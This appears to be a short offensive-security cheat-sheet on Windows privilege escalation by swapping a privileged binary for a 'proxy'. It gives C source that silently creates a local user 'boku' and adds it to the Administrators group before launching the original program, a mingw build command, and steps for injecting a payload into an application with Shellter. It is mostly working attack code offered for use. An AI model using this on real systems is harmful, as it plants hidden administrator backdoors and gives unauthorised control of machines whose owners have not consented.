# Binary Proxy

Given a privileged binary that we can replace/swap, we can build a proxy binary that execute our code before their.

## Manual

```sh
# The binary that we want to proxy is located at C:\bd\bd.exe
cat proxy.c
int main(void){
	system("net user boku mypassword /add");
	system("net localgroup Administrators boku /add");
	WinExec("C:\\bd\\bd.service.exe",0); # Make a backup of the original binary somewhere else
    return 0;
}
# Build proxy binary
i686-w64-mingw32-gcc proxy.c -l ws2_32 -o bd.exe
```

## Shellter

1. Download a copy of the entire app
2. Inject payload into app with Shellter
3. Replace main binary
4. Enjoy!
